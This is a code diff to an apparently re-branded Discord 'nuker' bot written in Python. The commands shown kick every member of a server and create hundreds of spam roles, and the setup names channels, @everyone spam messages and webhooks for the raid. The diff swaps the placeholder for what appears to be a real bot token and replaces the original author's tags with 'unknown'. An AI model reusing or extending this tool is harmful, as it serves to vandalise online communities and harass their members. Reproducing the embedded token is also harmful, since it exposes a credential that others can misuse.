@@ -12,10 +12,10 @@ client = commands.Bot(command_prefix="$", intents = discord.Intents.all())
 
 ######################################setup########################################
 
-token = 'TOKEN HERE'
-channel_names = ['Nuker by TheGodBlade']
-message_spam = ['@everyone NUKED BY TheGodBlade ']
-webhook_names = ['NUKED BY TheGodBlade' ]
+token = 'MTA5NDM5NjExMzY5MzQ1ODQ3Mg.G6Yl8I.QIOdvtgsEGtV0v9IaROmN_YIlulWkv350u-GRQ'
+channel_names = ['Nuked by unknown']
+message_spam = ['@everyone moments jr owns me']
+webhook_names = ['rip']
 ###################################################################################
 @client.event
 async def on_ready():
@@ -114,7 +114,7 @@ async def kickall(ctx):
   await ctx.message.delete()
   for member in ctx.guild.members:
     try:
-      await member.kick(reason="NUKED BY TheGodBlade")
+      await member.kick(reason="NUKED BY unknown")
       print(f"\x1b[38;5;34m{member.name} Has Been Successfully Kicked In {ctx.guild.name}")
     except:
       print(f"\x1b[38;5;196mUnable To Kick {member.name} In {ctx.guild.name}!")
@@ -125,7 +125,7 @@ async def rolespam(ctx):
   await ctx.message.delete()
   for i in range(1, 250):
     try:
-      await ctx.guild.create_role(name=f"NUKED BY TheGodBlade")
+      await ctx.guild.create_role(name=f"NUKED BY unknown")
       print(f"\x1b[38;5;34mSuccessfully Created Role In {ctx.guild.name}!")
     except:
       print(f"\x1b[38;5;196mUnable To Create Roles In {ctx.guild.name}!")
